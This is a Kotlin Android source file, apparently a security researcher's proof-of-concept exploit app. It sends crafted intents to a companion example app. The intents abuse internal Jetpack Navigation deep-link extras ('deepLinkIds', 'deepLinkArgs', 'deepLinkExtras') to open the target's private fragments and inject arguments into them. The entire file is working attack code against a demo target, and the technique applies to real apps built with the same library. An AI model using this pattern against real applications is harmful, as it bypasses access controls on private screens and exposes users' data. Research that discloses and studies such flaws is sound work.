package ru.ptsecurity.navigation_exploit

import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.widget.Button

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val graphs = mapOf("mobile_navigation" to 2131230995,"deferred_navigation" to 2131230865)
        val fragments = mapOf("private" to 2131231042,
            "first" to 2131231039,
            "second" to 2131231043,
            "private_deferred" to 2131230921)

        findViewById<Button>(R.id.button1).setOnClickListener {
            val fragmentId = intArrayOf(graphs["mobile_navigation"]!!,fragments["private"]!!)
            val b1 = Bundle()
            Intent().apply{
                setClassName("ru.ptsecurity.navigation_example","ru.ptsecurity.navigation_example.MainActivity")
                putExtra("android-support-nav:controller:deepLinkExtras", b1)
                putExtra("android-support-nav:controller:deepLinkIds", fragmentId)
            }.let{ startActivity(it)}
        }
        findViewById<Button>(R.id.button2).setOnClickListener {
            val fragmentId = intArrayOf(graphs["mobile_navigation"]!!,fragments["first"]!!,fragments["second"]!!,fragments["second"]!!,fragments["second"]!!)
            val b1 = Bundle().apply{putString("textFirst","application")}
            val b2 = Bundle().apply{putString("textSecond","exploit")}
            val b3 = Bundle().apply{putString("textSecond","from")}
            val b4 = Bundle().apply{putString("textSecond","Hello")}
            val bundles = arrayListOf<Bundle>(Bundle(),b1,b2,b3,b4)
            Intent().apply{
                setFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                setClassName("ru.ptsecurity.navigation_example","ru.ptsecurity.navigation_example.MainActivity")
                putExtra("android-support-nav:controller:deepLinkArgs", bundles)
                putExtra("android-support-nav:controller:deepLinkIds", fragmentId)
            }.let{ startActivity(it)}
        }
        findViewById<Button>(R.id.button3).setOnClickListener {
            val fragmentId = intArrayOf(graphs["deferred_navigation"]!!,fragments["private_deferred"]!!)
            val b1 = Bundle()
            Intent().apply{
                setClassName("ru.ptsecurity.navigation_example","ru.ptsecurity.navigation_example.MainActivity")
                putExtra("android-support-nav:controller:deepLinkExtras", b1)
                putExtra("android-support-nav:controller:deepLinkIds", fragmentId)
            }.let{ startActivity(it)}
        }
    }
}